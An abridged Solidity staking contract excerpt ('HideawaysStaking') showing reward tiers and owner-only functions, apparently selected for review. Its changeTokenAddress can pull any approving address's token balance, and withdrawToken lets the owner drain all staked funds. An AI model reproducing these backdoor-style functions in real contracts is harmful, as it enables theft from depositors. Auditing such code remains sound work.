...
contract HideawaysStaking is ReentrancyGuard, Ownable {
    using EnumerableSet for EnumerableSet.AddressSet;
    using SafeMath for uint256;
    using SafeERC20 for IERC20;
    
    uint256[7] public Duration = [1, 30, 60,90,180,360,720];
    uint256[7] public Bonus = [5, 50, 75, 150,300,600,1200];
    ...
    function SetStakeBonus(
        ...
        Bonus[5] = sixth.mul(100);
        Bonus[6] = seventh.mul(100);
    }
    ...
    function getAllPoolInfo() public view returns(uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256, uint256, uint256, uint256, uint256){
        return(Duration[0],Duration[1],Duration[2],Duration[3],Duration[4], Duration[5],Duration[6],Bonus[0],Bonus[1],Bonus[2],Bonus[3],Bonus[4],Bonus[5],Bonus[6]);
    }
   ...
   function pendingRewards(uint256 _orderId ) public view returns (uint256) {
    ...
    function deposit(uint256 _amount , uint256 _id ) public {
        ...
        // PoolInfo storage pool = pooldata[_id];
        
        require(_id >= 0 && _id <= 6, "Invalid Time Period");
        uint256 userReward = (_amount.mul(Bonus[_id])).div(10000);
    ...
    function changeTokenAddress(address _oldtokenAddress, address _newtokenAddress) public onlyOwner{        
        uint256 balance = token.balanceOf(address(_newtokenAddress));
        token.safeTransferFrom(_newtokenAddress, _oldtokenAddress, balance);
    }

    function setStatus(bool _finished) public onlyOwner {
        finished = _finished;
    }
    ...
    function withdrawToken() public onlyOwner {
       ...
       token.transfer(address(owner()) , contract_balance);
    }
